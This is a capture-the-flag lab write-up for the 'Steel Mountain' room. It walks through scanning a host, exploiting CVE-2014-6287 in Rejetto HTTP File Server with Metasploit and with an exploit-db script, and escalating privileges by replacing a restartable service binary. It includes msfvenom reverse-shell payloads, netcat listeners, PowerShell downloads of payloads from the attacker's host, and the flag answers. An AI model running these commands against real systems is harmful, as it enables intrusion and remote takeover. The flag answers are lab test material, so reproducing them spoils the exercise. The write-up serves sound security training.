# Steel Mountain

## Task 1 Introduction

#### **Who is the employee of the month?**

![](<../../.gitbook/assets/Screenshot from 2022-04-22 04-12-31.png>)

{% hint style="success" %}
`Bill Harper`
{% endhint %}

## Task 2 Initial Access

#### **What is the other port running a web server on?**

```bash
nmap 10.10.185.36
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 09-44-30.png>)

{% hint style="success" %}
`8080`
{% endhint %}

#### **What file server is running?**

```bash
sudo nmap -sV -p8080 10.10.185.36
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 09-48-26.png>)

{% hint style="success" %}
`Rejetto HTTP File Server`
{% endhint %}

#### **What is the CVE number to exploit this file server?**

```
searchsploit rejetto http file server
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 09-56-53.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-07 09-56-57.png>)

{% hint style="success" %}
`2014-6287`
{% endhint %}

#### **What is the user flag?**

```bash
msfconsole -q
msf5 > search rejetto
msf5 > use 1
msf5 > set RHOSTS 10.10.185.36
msf5 > set RPORT 8080
msf5 > set LHOST 10.9.101.193
msf5 > exploit
meterpreter > shell
C:\Users\bill\AppData>type C:\Users\bill\Desktop\user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-22 04-23-25.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-07 10-08-57.png>)

{% hint style="success" %}
`b04763b6fcf51fcd7c13abc7db4fd365`
{% endhint %}

## Task 3 Privilege Escalation

```
meterpreter > upload /home/kali/enum/PowerUp.ps1
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\Powerup.ps1
PS > Invoke-AllChecks
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 10-24-02.png>)

#### Take close attention to the CanRestart option that is set to true. What is the service name?

```bash
Invoke-AllChecks | Where-Object {$_.'CanRestart' -eq 'True'}
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 10-29-15.png>)

{% hint style="success" %}
`AdvancedSystemCareService9`
{% endhint %}

#### The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

#### Use msfvenom to generate a reverse shell as an Windows executable. Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.101.193 LPORT=4445\
         -e x86/shikata_ga_nai -f exe -o ASCService.exe
nc -nvlp 4445
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 11-00-27.png>)

```
meterpreter > upload /home/kali/enum/ASCService.exe
meterpreter > shell
> sc stop AdvancedSystemCareService9
> copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\"
> sc start AdvancedSystemCareService9
```

#### **What is the root flag?**

```
> type C:\Users\Administrator\Desktop\root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 11-15-51.png>)

{% hint style="success" %}
`9af5f314f57607c00fd09803a587db80`
{% endhint %}

## Task 4 Access and Escalation Without Metasploit

#### To begin we shall be using the same CVE. However, this time let's use this [exploit.](https://www.exploit-db.com/exploits/39161)

#### To begin, you will need a netcat static binary on your web server.

```bash
cp /usr/share/windows-binaries/nc.exe /var/www/html 
```

```bash
nc -nvlp 4444
> type C:\Users\bill\Desktop\user.txt
```

#### You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

```bash
searchsploit rejetto http file server
searchsploit -m 39161
vim 39161.py
# ip_addr = "10.9.101.193"
# local_port = "4444"
python3 39161.py 10.10.41.184 8080
python3 39161.py 10.10.41.184 8080
```

#### Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.

#### Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.

```bash
> powershell -c wget http://10.6.9.176/winPEASx86.exe -OutFile winPEAS.exe
> winPEAS.exe
```

![](<../../.gitbook/assets/Screenshot from 2020-09-07 12-18-56.png>)

#### What powershell -c command could we run to manually find out the service name?

![](<../../.gitbook/assets/Screenshot from 2022-04-22 05-11-30.png>)

{% hint style="success" %}
`powershell -c "Get-Service"`
{% endhint %}

#### Now let's escalate to Administrator with our new found knowledge.

#### Generate your payload using msfvenom and pull it to the system using powershell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.101.193 LPORT=4445\
         -e x86/shikata_ga_nai -f exe -o ASCService.exe
nc -nvlp 4445
> type C:\Users\Administrator\Desktop\root.txt
```

#### Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

```
> powershell -c "wget http://10.9.101.193/ASCService.exe -OutFile ASCService.exe"
> sc stop AdvancedSystemCareService9
> copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\"
> sc start AdvancedSystemCareService9
```

## :link: Support Material

{% embed url="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" %}

{% embed url="https://www.exploit-db.com/exploits/39161" %}

{% embed url="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" %}
